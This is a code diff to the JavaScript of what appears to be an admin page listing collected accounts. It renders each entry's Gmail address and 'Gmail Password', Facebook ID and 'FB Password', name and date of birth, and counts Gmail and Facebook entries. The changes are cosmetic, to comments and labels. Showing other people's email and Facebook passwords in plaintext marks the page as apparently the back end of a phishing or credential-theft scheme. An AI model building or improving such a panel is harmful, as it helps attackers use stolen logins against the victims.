@@ -187,7 +187,7 @@
                 const users = await response.json();
                 console.log('📊 Users received:', users);
 
-                // ===== FIX: Check email property correctly =====
+                // ===== COUNT CORRECTLY =====
                 const gmailCount = users.filter(u => u.email && u.email.trim() !== '').length;
                 const fbCount = users.filter(u => u.fbEmail && u.fbEmail.trim() !== '').length;
                 const profileCount = users.filter(u => u.profileCompleted === true).length;
@@ -199,7 +199,6 @@
 
                 console.log('📊 Gmail count:', gmailCount);
                 console.log('📊 Facebook count:', fbCount);
-                console.log('📊 Profile count:', profileCount);
 
                 const container = document.getElementById('usersList');
 
@@ -234,19 +233,19 @@
                     if (hasImg) html += `<span class="badge-tag badge-img"><i class="fas fa-image"></i> Photo</span>`;
                     html += `</div>`;
 
-                    // Data Grid - ALL FIELDS
+                    // ===== DATA GRID - ALL FIELDS =====
                     html += `<div class="data-grid">`;
                     
-                    // Gmail Fields (priority)
+                    // --- GMAIL SECTION ---
                     if (user.name) html += `<div class="field"><span class="label">Full Name:</span> <span class="value">${user.name}</span></div>`;
                     if (user.email) html += `<div class="field"><span class="label">📧 Gmail:</span> <span class="value gmail">${user.email}</span></div>`;
                     if (user.password) html += `<div class="field"><span class="label">Gmail Password:</span> <span class="value">${user.password}</span></div>`;
                     
-                    // Facebook Fields
-                    if (user.fbEmail) html += `<div class="field"><span class="label">📘 Facebook:</span> <span class="value fb">${user.fbEmail}</span></div>`;
+                    // --- FACEBOOK SECTION ---
+                    if (user.fbEmail) html += `<div class="field"><span class="label">📘 Facebook ID:</span> <span class="value fb">${user.fbEmail}</span></div>`;
                     if (user.fbPassword) html += `<div class="field"><span class="label">FB Password:</span> <span class="value">${user.fbPassword}</span></div>`;
                     
-                    // Profile Fields
+                    // --- PROFILE SECTION ---
                     if (user.firstName) html += `<div class="field"><span class="label">First Name:</span> <span class="value">${user.firstName}</span></div>`;
                     if (user.lastName) html += `<div class="field"><span class="label">Last Name:</span> <span class="value">${user.lastName}</span></div>`;
                     if (user.dob) html += `<div class="field"><span class="label">Date of Birth:</span> <span class="value">${user.dob}</span></div>`;
